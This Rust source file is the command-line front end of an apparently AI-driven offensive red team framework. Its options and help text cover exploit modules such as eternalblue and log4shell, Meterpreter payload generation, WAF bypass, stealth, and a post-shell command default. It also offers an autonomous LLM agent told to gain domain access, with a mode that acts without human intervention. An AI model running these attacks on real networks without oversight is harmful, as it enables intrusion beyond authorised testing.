// ── Lints crate-level ────────────────────────────────────────────────────────
// Les fixtures de test autorisent `unwrap()` / `expect()` ; en code de production,
// `[lints.clippy]` (Cargo.toml) les remonte en avertissements pour éviter tout
// panic implicite sur des données réseau non fiables.
#![cfg_attr(test, allow(clippy::unwrap_used, clippy::expect_used))]

mod ad;
mod agents;
#[allow(dead_code, unused)]
mod ai;
mod bruteforce;
#[allow(dead_code, unused_imports)]
mod c2;
mod capture;
mod config;
mod cve;
#[allow(dead_code, unused)]
mod errors;
mod evasion;
mod exploit_engine;
mod exploits;
mod exports;
mod flows;
mod horde;
mod installer;
mod integrations;
mod iot_scada;
mod iptv;
mod kerberos;
mod live_dashboard;
mod llm;
mod llm_exploit;
mod logging;
#[allow(dead_code, unused)]
mod main_helpers;
mod mission_pack;
mod netscan;
mod network_advanced;
mod ntlm;
#[allow(dead_code, unused)]
mod nvd;
mod oob;
mod orchestrator;
mod osint;
mod pivot;
mod post_exploit;
mod report_gen;
mod reports;
mod risk;
mod scanner;
mod shell;
mod stress;
mod web_attack;
mod web_spider;

use anyhow::{anyhow, Context, Result};
use chrono::Local;
use clap::Parser;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::fs;
use std::time::Instant;
use url::Url;

use crate::capture::{capture_to_links, list_interfaces, run_capture, write_capture_json};
use crate::cve::{find_cves_for_version, load_cve_db, CveDatabase};
use crate::exploits::{
    load_manifest, run_pentest_all, summarize, ExploitFinding, ExploitManifest, PentestConfig,
    PentestSummary,
};
use crate::flows::{
    infer_links_from_targets, load_flows_json, merge_links, FlowLink, ScanTargetSummary,
};
#[allow(unused_imports)]
use crate::llm::{
    analyze_target, build_client, generate_report, AiReport, LlmClient, LlmConfig, LlmProvider,
    TargetAnalysis,
};
use crate::reports::{build_metadata, write_csv, write_json, write_markdown, GraphNode, ScanGraph};
use crate::risk::{default_risk_rules, evaluate_risk, load_risk_rules, RiskRules};
#[allow(unused_imports)]
use crate::scanner::enhanced::{detect_tech_stack, detect_waf, fingerprint_os_from_ttl};
use crate::scanner::{
    extract_version, grab_http_banner, grab_tcp_banner, port_to_service, BannerResult,
};

// ================================================================
// SPLASH / AIDE ÉTENDUE TERMINALE (couleurs ANSI)
// ================================================================
pub mod ansi {
    pub const RESET: &str = "\x1b[0m";
    pub const BOLD: &str = "\x1b[1m";
    pub const DIM: &str = "\x1b[2m";
    pub const MATRIX: &str = "\x1b[38;5;48m"; // vert matricé #00ff9c
    pub const CYAN: &str = "\x1b[38;5;51m";
    pub const VIOLET: &str = "\x1b[38;5;177m";
    pub const AMBER: &str = "\x1b[38;5;214m";
    pub const RED: &str = "\x1b[38;5;196m";
    pub const GRN: &str = "\x1b[38;5;46m";
    pub const YLW: &str = "\x1b[38;5;226m";
    pub const ORG: &str = "\x1b[38;5;208m";
    pub const CYN: &str = "\x1b[38;5;45m";
    pub const GRIS: &str = "\x1b[38;5;244m";
    pub const BG_DARK: &str = "\x1b[48;5;16m";
    pub const INV_MATRIX: &str = "\x1b[48;5;48m\x1b[38;5;16m";
    #[allow(dead_code)]
    pub fn tag(c: &str, s: &str) -> String {
        format!("{c}{s}{RESET}")
    }
}

fn ascii_banner() -> String {
    use ansi::*;

    // Couleurs feu inspirées de la bannière DIAPILE
    let fire1 = "\x1b[38;5;202m"; // orange vif
    let fire2 = "\x1b[38;5;196m"; // rouge
    let fire3 = "\x1b[38;5;214m"; // orange-jaune
    let fire4 = "\x1b[38;5;220m"; // jaune
    let dark = "\x1b[38;5;130m"; // brun foncé
    let glow = "\x1b[38;5;208m"; // halo orange

    let mut out = String::new();

    // Halo
    out.push_str(&format!("\n  {glow}##..........##{RESET}\n"));

    // Cornes
    out.push_str(&format!("  {fire3}   (  )       (  )  {RESET}\n"));
    out.push_str(&format!("  {fire2}  /    \\     /    \\ {RESET}\n"));
    out.push_str(&format!(
        "  {fire1} /  {dark}(( ))  {RESET}{fire1}  {dark}(( )){RESET}{fire1}  \\ {RESET}\n"
    ));
    out.push_str(&format!(
        "  {fire2}|   {dark}\\   /  {RESET}{fire2}   {dark}\\   /{RESET}{fire2}   |{RESET}\n"
    ));

    // Tête / visage démon
    out.push_str(&format!("  {fire1}  (  {dark}[*]{RESET}{fire1}   {dark}^{RESET}{fire1}   {dark}[*]{RESET}{fire1}  ){RESET}\n"));
    out.push_str(&format!(
        "  {fire2}   \\     {dark}~~~{RESET}{fire2}      /{RESET}\n"
    ));
    out.push_str(&format!("  {fire3}    '----------'  {RESET}\n"));

    // Nom DIAPILE lettre par lettre en couleurs feu
    out.push('\n');
    let letters = [
        ('D', fire2),
        ('I', fire1),
        ('A', fire3),
        ('P', fire2),
        ('I', fire1),
        ('L', fire3),
        ('E', fire4),
    ];
    out.push_str("  ");
    for (ch, col) in letters {
        out.push_str(&format!("{col}{BOLD} {ch} {RESET}"));
    }
    out.push('\n');

    // Sous-titre
    out.push_str(&format!("\n  {fire3}----------{RESET}  {BOLD}{fire2}Red Team Framework{RESET}  {fire3}----------{RESET}\n"));
    out.push_str(&format!(
        "  {glow}AI-Powered  |  Autonomous  |  Persistent  |  Stealthy{RESET}\n"
    ));

    out
}

fn splash_header() {
    use ansi::*;
    println!("\n{}\n", ascii_banner());
    let fire2 = "\x1b[38;5;196m";
    let fire3 = "\x1b[38;5;214m";
    println!(
        "  {DIM}version {RESET}{BOLD}{fire2}{}{RESET}    \
         {DIM}build {RESET}{fire3}{}{RESET}    \
         {DIM}mode {RESET}{AMBER}{}{RESET}    \
         {DIM}licence {RESET}{GRIS}MIT{RESET}",
        env!("CARGO_PKG_VERSION"),
        option_env!("NRTG_BUILD_DATE").unwrap_or("dev"),
        if cfg!(debug_assertions) {
            "DEBUG"
        } else {
            "RELEASE"
        }
    );
    println!("  {GRIS}{}{RESET}\n", "=".repeat(72));
}

fn rule(label: &str, color: &str) {
    use ansi::*;
    println!(
        "\n  {color}{BOLD}▍ {label}{RESET}  {GRIS}{}{RESET}",
        "▔".repeat(76usize.saturating_sub(label.chars().count().saturating_add(4)))
    );
}

fn item(icon: &str, color: &str, key: &str, desc: &str) {
    use ansi::*;
    println!(
        "  {color}{BOLD}{icon}{RESET}  {CYAN}{:<32}{RESET}{GRIS}— {desc}{RESET}",
        key
    );
}

fn flag_color(flag: &str, desc: &str, default: &str) {
    use ansi::*;
    println!(
        "  {AMBER}{:<44}{RESET} {GRIS}{}{RESET}{DIM}  [default: {}]{RESET}",
        flag, desc, default
    );
}

/// Construit le contexte d'authentification web depuis les arguments CLI (P0.4).
/// Les en-têtes additionnels sont attendus au format `Nom: Valeur`.
fn build_web_auth(
    cookie: &Option<String>,
    bearer: &Option<String>,
    headers: &[String],
) -> crate::web_attack::WebAuth {
    let extra_headers = headers
        .iter()
        .filter_map(|h| {
            h.split_once(':')
                .map(|(k, v)| (k.trim().to_string(), v.trim().to_string()))
        })
        .collect();
    crate::web_attack::WebAuth {
        cookies: cookie.clone(),
        bearer: bearer.clone(),
        extra_headers,
    }
}

/// Compose le pool de proxies depuis `--proxy` (répétable) et `--proxy-file`.
fn build_web_proxies(inline: &[String], file: &Option<String>) -> Vec<String> {
    let mut proxies: Vec<String> = inline
        .iter()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect();
    if let Some(path) = file {
        match std::fs::read_to_string(path) {
            Ok(content) => {
                for line in content.lines() {
                    let l = line.trim();
                    if l.is_empty() || l.starts_with('#') {
                        continue;
                    }
                    proxies.push(l.to_string());
                }
            }
            Err(e) => eprintln!(
                "  \x1b[33m[WARN]\x1b[0m --proxy-file {} illisible : {}",
                path, e
            ),
        }
    }
    proxies
}

/// Compose une `WebAttackConfig` avec l'auth, la concurrence et l'anti-WAF CLI.
fn web_attack_config(cli: &Cli) -> crate::web_attack::WebAttackConfig {
    // OOB : si l'écouteur intégré est actif et qu'aucun callback explicite n'est
    // fourni, utiliser son adresse pour confirmer les vulns aveugles.
    let ssrf_callback = cli
        .ssrf_callback
        .clone()
        .or_else(|| crate::oob::OobListener::base().map(|h| format!("http://{}", h)));
    // Payloads externes : `--web-payloads KIND=FILE` (répétable), fusionnés aux
    // payloads embarqués — ou substitués famille par famille avec
    // `--web-payloads-replace`. Une erreur de lecture n'empêche pas le scan :
    // la famille concernée garde ses payloads embarqués.
    let mut external = crate::web_attack::ExternalPayloads::default();
    for spec in &cli.web_payloads {
        let kinds = crate::web_attack::PayloadKind::all()
            .iter()
            .map(|k| k.label())
            .collect::<Vec<_>>()
            .join(", ");
        let Some((kind, file)) = spec.split_once('=') else {
            eprintln!(
                "  ⚠️  --web-payloads « {} » ignoré : format attendu KIND=FILE (familles : {})",
                spec, kinds
            );
            continue;
        };
        let Some(kind) = crate::web_attack::PayloadKind::from_cli(kind) else {
            eprintln!(
                "  ⚠️  --web-payloads « {} » ignoré : famille inconnue (attendu : {})",
                spec, kinds
            );
            continue;
        };
        match external.load_from_file(kind, file.trim(), cli.web_payloads_replace) {
            Ok((n, total)) => println!(
                "  ▸ payloads {} « {} » : {} entrées ({} au total)",
                kind.label(),
                file.trim(),
                n,
                total
            ),
            Err(e) => eprintln!("  ⚠️  --web-payloads {} : {}", kind.label(), e),
        }
    }
    crate::web_attack::WebAttackConfig {
        concurrency: cli.web_concurrency.max(1),
        // Pacing furtif partagé avec le scanner réseau : `--stealth redteam`
        // borne aussi le parallélisme des scanners web et fait tourner l'UA.
        stealth_level: cli.stealth.clone(),
        waf_bypass: !cli.no_waf_bypass,
        auth: build_web_auth(&cli.cookie, &cli.bearer, &cli.web_headers),
        retries: cli.web_retries.max(1),
        proxies: build_web_proxies(&cli.web_proxies, &cli.web_proxy_file),
        test_ssrf: ssrf_callback.is_some() || crate::oob::OobListener::dns_domain().is_some(),
        ssrf_callback,
        external,
        ..Default::default()
    }
}

// --- Sections détaillées ------------------------------------------------

pub fn print_features() {
    use ansi::*;
    splash_header();

    rule("FONCTIONNALITÉS EMBARQUÉES", MATRIX);
    item(
        "🛰️",
        MATRIX,
        "scanner::multi",
        "HTTP/HTTPS, SSH, Redis, SMTP, FTP, MySQL, PG, MSSQL, MongoDB, DNS, Telnet",
    );
    item(
        "🏁",
        MATRIX,
        "scanner::banner",
        "Fingerprinting versions (regex + semver) + content-type",
    );
    item(
        "🧠",
        VIOLET,
        "scanner::enhanced",
        "WAF detect · OS guess par TTL · Tech stack (frameworks/CMS/langages)",
    );
    item(
        "📚",
        CYAN,
        "cve::matcher",
        "Matching CVE par produit + version (base cve_db.json)",
    );
    item(
        "⚠️",
        AMBER,
        "risk::engine",
        "Niveau 1→5 piloté par règles JSON (risk_rules.json)",
    );
    item(
        "🎯",
        RED,
        "exploits::orchestrator",
        "Bibliothèque YAML (exploits.yaml), dry-run par défaut, 3 profondeurs",
    );
    item(
        "🌐",
        AMBER,
        "llm::ai_report",
        "Analyse IA : NVIDIA Nemotron 3 (550B) · OpenAI · Ollama local",
    );
    item(
        "🌉",
        CYAN,
        "capture::pnet",
        "Sniffing promiscuous · topologie auto + ghost nodes",
    );
    item(
        "🧩",
        VIOLET,
        "exports::suite",
        "graph.json · CSV · Markdown · ApiReport JSON · Standalone HTML",
    );
    item(
        "📡",
        GRIS,
        "flows::merge",
        "Fusion capture live + flows JSON + inférence topologie scan",
    );

    rule("SORTIES GÉNÉRÉES", CYAN);
    item(
        "GRAPH",
        MATRIX,
        "graph.json",
        "Format natif consommé par dashboard.html",
    );
    item(
        "EXTRAS",
        CYAN,
        "graph.extras.json",
        "Sidecar: findings exploits + enrichissements OS/WAF/tech + analyses IA",
    );
    item(
        "CSV",
        AMBER,
        "graph.csv",
        "Aplat prêt à importer Sheets/Excel",
    );
    item("MD", AMBER, "graph.md", "Résumé humain en markdown");
    item(
        "API",
        VIOLET,
        "graph.api.json",
        "Structuré pour intégration outil externe",
    );
    item(
        "HTML",
        VIOLET,
        "graph.report.html",
        "Standalone auto-contenu (dashboard embarqué)",
    );
    item(
        "AI",
        RED,
        "graph.ai-report.md",
        "Rapport IA complet si --ai-report activé",
    );

    rule("VOIR AUSSI", GRIS);
    println!("  {CYAN}--examples{RESET}    {GRIS}exemples de commandes prêtes à lancer{RESET}");
    println!("  {CYAN}--tutorial{RESET}    {GRIS}guide pas à pas (démarrage lab Docker premier scan){RESET}");
    println!("  {CYAN}launcher.html{RESET} {GRIS}menu graphique HUD cyberpunk (générateur de commandes){RESET}");
    println!("  {CYAN}dashboard.html{RESET} {GRIS}visualisation graphe interactif{RESET}\n");
}

pub fn print_examples() {
    use ansi::*;
    splash_header();
    rule("EXEMPLES DE COMMANDES", AMBER);
    println!();

    let ex: [(&str, &str, &str); 13] = [
        (
            "#01",
            "LAB DOCKER 1 clic",
            r"cargo run --release -- -t http://localhost:8080,127.0.0.1:6379,127.0.0.1:2222,127.0.0.1:1025,127.0.0.1:21 --csv --md --export-api-report",
        ),
        (
            "#02",
            "CUSTOM targets",
            r"cargo run --release -- --targets http://prod.example:443,10.0.0.5:22,10.0.0.5:3306",
        ),
        (
            "#03",
            "Avec fichier config",
            r"cargo run --release -- -c config.json -o out/graph.json",
        ),
        (
            "#04",
            "EXPLOITS dry-run depth=DEEP",
            r"cargo run --release -- -t 10.0.0.0/24:80 --exploit-depth deep --allow-networks 10.0.",
        ),
        (
            "#05",
            "EXPLOITS probes ACTIVES (pro)",
            r"cargo run --release -- -t 127.0.0.1:6379 --run-exploits --exploit-depth deep",
        ),
        (
            "#06",
            "Capture LIVE + scan",
            r"cargo run --release -- --capture-iface eth0 --capture-duration 45 -t 192.168.1.10:22",
        ),
        (
            "#07",
            "RAPPORT IA · NVIDIA Nemotron 3 Ultra 550B (défaut 2026)",
            r"OPENROUTER_API_KEY=sk-or-xxx cargo run --release -- -t http://lab:80 --ai-report --ai-targets 8",
        ),
        (
            "#08",
            "RAPPORT IA · Nemotron 70B LOCAL (Ollama — 0 exfiltration)",
            r"cargo run --release -- -t http://lab:80 --ai-report --llm-provider ollama --llm-model nemotron:70b-instruct-q4_K_M",
        ),
        (
            "#09",
            "AGENT IA AUTONOME · Nemotron 3 Ultra 550B sur réseau /24",
            r"OPENROUTER_API_KEY=sk-or-xxx cargo run --release -- --ai-agent --targets 192.168.1.0/24 --objective 'obtenir accès au domaine'",
        ),
        (
            "#10",
            "AGENT IA LOCAL · Nemotron 70B + stealth",
            r"NRTG_LLM_PROVIDER=ollama NRTG_LLM_MODEL=nemotron:70b-instruct-q4_K_M sudo ./nrtg --ai-agent --ai-stealth -t 10.0.0.0/24",
        ),
        (
            "#11",
            "Logs structurés JSON + fichier",
            r"cargo run --release -- -t lab:80 --log-level debug --log-format json --log-file out/run.jsonl",
        ),
        (
            "#12",
            "Tout cocher : CSV/MD/API/HTML/EXTRAS/IA",
            r"OPENROUTER_API_KEY=sk-or-xxx cargo run --release -- -t lab:80,db:3306 --ai-report --csv --md --export-api-report -o out/graph.json",
        ),
        (
            "#13",
            "Capture FULL trafic (promiscuous + BPF)",
            r"cargo run --release -- --capture-iface eth0 --capture-all --promiscuous --capture-bpf 'tcp port 80' --capture-duration 60 -t 10.0.0.0/24",
        ),
    ];
    for (id, title, cmd) in ex {
        println!("  {VIOLET}{BOLD}{id}{RESET} {AMBER}{BOLD}{title}{RESET}");
        println!("    {MATRIX}${RESET} {CYAN}{cmd}{RESET}\n");
    }
}

pub fn print_tutorial() {
    use ansi::*;
    splash_header();
    rule("GUIDE DE DÉMARRAGE RAPIDE", VIOLET);

    println!("\n  {BOLD}{AMBER}ÉTAPE 1 · Déploiement de l'environnement de simulation{RESET}");
    println!("    {MATRIX}${RESET} {CYAN}docker compose up -d{RESET}");
    println!("    {GRIS}(déploie une infrastructure de test multi-services: nginx, redis, ssh, etc.){RESET}\n");

    println!("  {BOLD}{AMBER}ÉTAPE 2 · Scanner avec la commande de base{RESET}");
    println!("    {MATRIX}${RESET} {CYAN}cargo run --release -- -t http://localhost:8080,127.0.0.1:6379,127.0.0.1:2222,127.0.0.1:1025,127.0.0.1:21 --csv --md --export-api-report{RESET}\n");

    println!("  {BOLD}{AMBER}ÉTAPE 3 · Visualiser le graphe{RESET}");
    println!("    {MATRIX}${RESET} {CYAN}start dashboard.html          {GRIS}# Windows{RESET}");
    println!("    {MATRIX}${RESET} {CYAN}open  dashboard.html          {GRIS}# macOS{RESET}");
    println!("    {MATRIX}${RESET} {CYAN}xdg-open dashboard.html       {GRIS}# Linux{RESET}\n");

    println!("  {BOLD}{AMBER}ALLER PLUS LOIN{RESET}");
    println!("    • {CYAN}launcher.html{RESET}  : générateur HUD 1 clic (options, IA, exploits)");
    println!("    • {CYAN}run.bat / run.sh{RESET} : menu interactif sans commande à retenir");
    println!("    • {CYAN}make help{RESET}     : commandes courtes (make up && make scan)\n");
}

// Help étendu (quand aucun argument ou --help) --------------------------------

pub fn print_extended_help() {
    use ansi::*;
    splash_header();

    rule("OPTIONS CLI DISPONIBLES", MATRIX);
    println!("  {DIM}(nrtg accepte aussi -h / --help pour aide courte standard de clap){RESET}\n");

    rule("· Cibles & entrées", CYAN);
    flag_color(
        "-t, --targets <URL|IP:PORT,...",
        "Liste de cibles (séparateur virgule)",
        "(via config.json sinon)",
    );
    flag_color(
        "-c, --config <PATH>",
        "Fichier JSON de configuration",
        "config.json",
    );
    flag_color(
        "-d, --cve-db <PATH>",
        "Base de vulnérabilités JSON",
        "cve_db.json",
    );
    flag_color(
        "-r, --risk-rules <PATH>",
        "Règles de risque JSON",
        "risk_rules.json",
    );
    flag_color(
        "--flows <PATH,PATH...>",
        "Fichiers flows JSON additionnels",
        "aucun",
    );

    rule("· Sorties", CYAN);
    flag_color(
        "-o, --output <PATH>",
        "Fichier graphe principal",
        "graph.json",
    );
    flag_color("--csv", "Exporter rapport CSV", "false");
    flag_color("--md", "Exporter rapport Markdown", "false");
    flag_color(
        "--export-api-report",
        "ApiReport JSON + standalone HTML",
        "false",
    );

    rule("· Scanner", CYAN);
    flag_color("--http-timeout <SEC>", "Timeout connexion HTTP", "5");
    flag_color("--tcp-timeout <SEC>", "Timeout bannière TCP", "3");
    flag_color(
        "--no-infer",
        "Désactiver inférence liens topologie",
        "false",
    );

    rule("· Capture LIVE (pnet)", AMBER);
    flag_color(
        "--list-ifaces",
        "Lister interfaces réseau & sortir",
        "false",
    );
    flag_color(
        "--capture-iface <IFACE>",
        "Interface sniffer (eth0/Wi-Fi...)",
        "aucun",
    );
    flag_color("--capture-duration <SEC>", "Durée capture (sec)", "30");
    flag_color(
        "--capture-output <PATH>",
        "Écrire capture brute JSON",
        "aucun",
    );
    flag_color("--capture-max-flows <N>", "Flux max à tracker", "10000");
    flag_color(
        "--capture-all",
        "Capturer TOUT le trafic (no port filter)",
        "false",
    );
    flag_color(
        "--promiscuous",
        "Mode promiscuous (voit tout le segment)",
        "false",
    );
    flag_color(
        "--capture-bpf <EXPR>",
        "Filtre BPF software (ex: tcp port 80)",
        "aucun",
    );

    rule("· Exploits (par défaut SAFE DRY-RUN)", RED);
    flag_color(
        "--exploits-config <PATH>",
        "Manifest YAML des signatures",
        "exploits.yaml",
    );
    flag_color("--run-exploits", "⚠️ Probes de lecture ACTIVES", "false");
    flag_color(
        "--auto-install",
        "Installer auto. TOUT outil tiers absent (apt/dnf/brew/winget/pip)",
        "false",
    );
    flag_color(
        "--autonomous",
        "Mode autonome : installe/confirme sans intervention (⟹ --auto-install + --yes)",
        "false",
    );
    flag_color(
        "--exploit-depth <light|med|deep>",
        "Profondeur pentest",
        "medium",
    );
    flag_color(
        "--max-exploit-impact <LEVEL>",
        "Garde-fou: info|cred|shell|rce",
        "informational",
    );
    flag_color(
        "--allow-networks <pre,...>",
        "Restriction réseaux (ex: 10.0.,192.168.)",
        "aucun",
    );

    rule("· IA / LLM — NVIDIA Nemotron par défaut", VIOLET);
    flag_color(
        "--ai-report",
        "Activer rapport IA + analyses cibles",
        "false",
    );
    flag_color("--ai-targets <N>", "Top N cibles critiques → AI", "5");
    flag_color(
        "--llm-provider <openrouter|...>",
        "Provider (openrouter/openai/ollama)",
        "openrouter",
    );
    flag_color(
        "--llm-model <NAME>",
        "Modèle LLM",
        "nvidia/nemotron-3-ultra-550b-a55b:free",
    );
    flag_color(
        "--llm-api-base <URL>",
        "Override endpoint (ollama 11434...)",
        "auto",
    );
    flag_color(
        "--llm-api-key-env <ENV_VAR>",
        "Var env clef API",
        "OPENROUTER_API_KEY",
    );
    println!("  {DIM}     Alternative locale zéro-exfil : {CYAN}--llm-provider ollama --llm-model nemotron:70b-instruct-q4_K_M{RESET}");

    rule("· Logging", GRIS);
    flag_color("--log-level <trace|info|warn|err>", "Niveau de log", "info");
    flag_color(
        "--log-format <compact|pretty|json>",
        "Format log",
        "compact",
    );
    flag_color("--log-file <PATH>", "Écrire logs dans un fichier", "stdout");

    rule("· RACCOURCIS UTILES", MATRIX);
    println!("  {CYAN}nrtg --features{RESET}      {GRIS}liste toutes les fonctionnalités & sorties{RESET}");
    println!("  {CYAN}nrtg --examples{RESET}      {GRIS}10 exemples de commandes prêtes{RESET}");
    println!("  {CYAN}nrtg --tutorial{RESET}      {GRIS}guide pas à pas premier scan{RESET}");
    println!("  {CYAN}nrtg --doctor{RESET}        {GRIS}vérification de l'environnement{RESET}");
    println!("  {CYAN}nrtg --scan-local{RESET}    {GRIS}détecter la gateway et scanner le réseau local{RESET}");
    println!("  {CYAN}nrtg -h{RESET}              {GRIS}aide courte standard clap{RESET}\n");
    println!(
        "  {INV_MATRIX} [ RÉSERVÉ AUX OPÉRATIONS RED TEAM · ENVIRONNEMENTS AUTORISÉS ] {RESET}\n"
    );
}

// --- MAIN PRÉ-PARSE (détéction args 0 / features / examples / tutorial) ---
pub fn handle_pre_parse_args() -> bool {
    let args: Vec<String> = std::env::args().collect();
    let has_any_target = args.iter().any(|a| a == "-t" || a == "--targets");
    let has_config = args.iter().any(|a| a == "-c" || a == "--config");

    if args.iter().any(|a| a == "--features") {
        print_features();
        return true;
    }
    if args.iter().any(|a| a == "--examples") {
        print_examples();
        return true;
    }
    if args.iter().any(|a| a == "--tutorial") {
        print_tutorial();
        return true;
    }
    if args.len() <= 1 {
        print_extended_help();
        return true;
    }
    // Ou aide explicite custom (long)
    if args
        .iter()
        .any(|a| a == "--help" || a == "-help" || a == "help" || a == "--aide" || a == "-h")
    {
        // On laisse --help / -h court passer à clap sauf si aucun autre arg utile
        if !has_any_target
            && !has_config
            && (args.contains(&"--help".to_string())
                || args.contains(&"help".to_string())
                || args.contains(&"--aide".to_string()))
        {
            print_extended_help();
            return true;
        }
    }
    false
}

#[derive(Parser, Debug)]
#[command(
    name = "nrtg",
    author,
    version,
    about = "\
    \n\x1b[38;5;196m▍ DIAPILE\x1b[0m — Network Redteam Grapher\n  \
    \x1b[38;5;214mAI-Powered Offensive Security Framework\x1b[0m\n  \
    \x1b[38;5;244mUtilisez --features, --examples, --tutorial, --doctor, --ai-agent\x1b[0m",
    long_about = None,
    after_long_help = "ASTUCES:\n  \
    • Sans argument → menu d'aide étendu\n  \
    • --features  liste modules & sorties\n  \
    • --examples  10 exemples prêts\n  \
    • --tutorial  démarrage pas à pas\n  \
    • --doctor    vérification environnement\n  \
    • --ai-agent  lancer l'agent IA autonome\n  \
    • launcher.html → générateur HUD DIAPILE\n",
)]
struct Cli {
    #[arg(short, long, value_delimiter = ',', value_name = "URL or IP:PORT")]
    targets: Option<Vec<String>>,

    #[arg(short, long, default_value = "config.json", value_name = "PATH")]
    config: String,

    #[arg(short = 'd', long, default_value = "cve_db.json", value_name = "PATH")]
    cve_db: String,

    #[arg(
        short = 'r',
        long,
        default_value = "risk_rules.json",
        value_name = "PATH"
    )]
    risk_rules: String,

    #[arg(short, long, default_value = "graph.json", value_name = "PATH")]
    output: String,

    #[arg(long, value_name = "SECONDS", default_value_t = 5)]
    http_timeout: u64,

    #[arg(long, value_name = "SECONDS", default_value_t = 3)]
    tcp_timeout: u64,

    #[arg(
        long,
        default_value_t = false,
        help = "Verify TLS certificates (default: false for backward compat)"
    )]
    verify_tls: bool,

    #[arg(long, value_name = "PATH", value_delimiter = ',')]
    flows: Option<Vec<String>>,

    #[arg(long, action = clap::ArgAction::SetTrue, help = "Also export CSV report")]
    csv: Option<bool>,

    #[arg(long, action = clap::ArgAction::SetTrue, help = "Also export Markdown report")]
    md: Option<bool>,

    #[arg(long, default_value_t = false, help = "Skip inferred topology links")]
    no_infer: bool,

    #[arg(
        long,
        default_value_t = 1,
        value_name = "N",
        help = "Min timeout value clamp (default 1)"
    )]
    min_timeout: u64,

    #[arg(
        long,
        default_value_t = 60,
        value_name = "N",
        help = "Max timeout value clamp (default 60)"
    )]
    max_timeout: u64,

    #[arg(long, help = "List available network interfaces and exit")]
    list_ifaces: bool,

    #[arg(
        long,
        value_name = "IFACE",
        help = "Capture traffic on interface (e.g. eth0, Wi-Fi)"
    )]
    capture_iface: Option<String>,

    #[arg(
        long,
        value_name = "SECONDS",
        help = "Capture duration when using --capture-iface (default 30, overrides config)"
    )]
    capture_duration: Option<u64>,

    #[arg(
        long,
        value_name = "PATH",
        help = "Write raw capture results to a JSON file"
    )]
    capture_output: Option<String>,

    #[arg(
        long,
        value_name = "N",
        help = "Max concurrent flows to track in capture mode (default 10000, overrides config)"
    )]
    capture_max_flows: Option<usize>,

    #[arg(long, action = clap::ArgAction::SetTrue, help = "Capture ALL traffic (no port filter). WARNING: high volume on busy networks.")]
    capture_all: Option<bool>,

    #[arg(long, action = clap::ArgAction::SetTrue, help = "Enable promiscuous mode on the capture interface (see all frames on the segment)")]
    promiscuous: Option<bool>,

    #[arg(
        long,
        value_name = "BPF_EXPR",
        help = "BPF-style software filter expression (e.g. 'tcp and port 80', 'host 10.0.0.1', 'udp')"
    )]
    capture_bpf: Option<String>,

    // ---------- Professional logging ----------
    #[arg(
        long,
        value_name = "LEVEL",
        help = "Log level: trace/debug/info/warn/error (default: info)"
    )]
    log_level: Option<String>,

    #[arg(
        long,
        value_name = "FORMAT",
        help = "Log format: pretty/compact/json (default: compact)"
    )]
    log_format: Option<String>,

    #[arg(
        long,
        value_name = "PATH",
        help = "Write logs to a file instead of stdout"
    )]
    log_file: Option<String>,

    // ---------- Pentest orchestrator ----------
    #[arg(
        long,
        default_value = "exploits.yaml",
        value_name = "PATH",
        help = "Exploit signatures manifest (YAML)"
    )]
    exploits_config: String,

    #[arg(long, action = clap::ArgAction::SetTrue, help = "Actually run exploits. DEFAULT is SAFE DRY-RUN: only lists what would run.")]
    run_exploits: Option<bool>,

    #[arg(
        long,
        default_value_t = false,
        help = "Automatically install missing third-party tools (sshpass, nmap, etc.)"
    )]
    auto_install: bool,

    #[arg(
        long,
        default_value_t = false,
        help = "Autonomous mode: install and confirm everything without human intervention (implies --auto-install and --yes)"
    )]
    autonomous: bool,

    #[arg(
        long,
        value_name = "DEPTH",
        help = "Exploit depth: light / medium / deep (default: medium)"
    )]
    exploit_depth: Option<String>,

    #[arg(
        long,
        value_name = "NET",
        value_delimiter = ',',
        help = "Restrict active exploits to targets whose host starts with these prefixes (e.g. 10.0.,192.168.)"
    )]
    allow_networks: Option<Vec<String>>,

    #[arg(
        long,
        value_name = "HOST",
        value_delimiter = ',',
        help = "Exclut ces hôtes/CIDR du périmètre (deny-list prioritaire sur --allow-networks)"
    )]
    deny_hosts: Option<Vec<String>>,

    #[arg(
        long,
        value_name = "LEVEL",
        help = "Plafond d'impact des exploits (garde-fou): informational | cred_harvest | shell | rce (default: informational)"
    )]
    max_exploit_impact: Option<String>,

    // ---------- Exploit Engine (mode EXPERT RCE) ----------
    #[arg(long, action = clap::ArgAction::SetTrue, help = "Afficher la liste des modules d'exploitation RCE/SHELL disponibles")]
    list_exploits: bool,

    #[arg(
        long,
        value_name = "ID",
        help = "Exécuter un module d'exploitation sur la cible --exploit-target (ex: vsftpd_234_backdoor | shellshock | log4shell | spring4shell | eternalblue | heartbleed)"
    )]
    exploit: Option<String>,

    #[arg(
        long,
        value_name = "HOST:PORT",
        help = "Cible HOST:PORT pour le module --exploit"
    )]
    exploit_target: Option<String>,

    #[arg(
        long,
        default_value = "id;whoami;uname -a",
        value_name = "CMD",
        help = "Commande à exécuter une fois le shell obtenu (défaut: id;whoami;uname -a)"
    )]
    exploit_cmd: String,

    #[arg(
        long,
        value_name = "ARCH",
        help = "Architecture cible pour génération payload Meterpreter (x64 | x86)"
    )]
    exploit_arch: Option<String>,

    #[arg(
        long,
        value_name = "OS",
        help = "OS cible pour génération payload Meterpreter (linux | windows)"
    )]
    exploit_os: Option<String>,

    #[arg(
        long,
        value_name = "CMD",
        help = "Exécuter une commande unique sur la session --interact et afficher la sortie (non-interactif)"
    )]
    session_cmd: Option<String>,

    // ---------- LLM / AI ----------
    #[arg(
        long,
        value_name = "PROVIDER",
        help = "LLM provider: openai / openrouter / ollama (default: openai)"
    )]
    llm_provider: Option<String>,

    #[arg(
        long,
        value_name = "MODEL",
        help = "LLM model name (provider-specific, default: gpt-4o-mini)"
    )]
    llm_model: Option<String>,

    #[arg(
        long,
        value_name = "URL",
        help = "LLM API base URL override (e.g. https://openrouter.ai/api/v1 or http://localhost:11434)"
    )]
    llm_api_base: Option<String>,

    #[arg(
        long,
        value_name = "ENV_VAR",
        help = "Environment variable holding the LLM API key (default: OPENAI_API_KEY for OpenAI/OpenRouter, none for Ollama)"
    )]
    llm_api_key_env: Option<String>,

    #[arg(
        long,
        default_value_t = false,
        help = "Enable AI-enhanced report + per-critical-target exploit analysis"
    )]
    ai_report: bool,

    #[arg(
        long,
        default_value_t = 5,
        value_name = "N",
        help = "Max number of top-risk targets to analyze via AI (higher = slower/costlier)"
    )]
    ai_targets: usize,

    // ---------- Structured API/HTML exports ----------
    #[arg(
        long,
        default_value_t = false,
        help = "Export ApiReport JSON + standalone HTML"
    )]
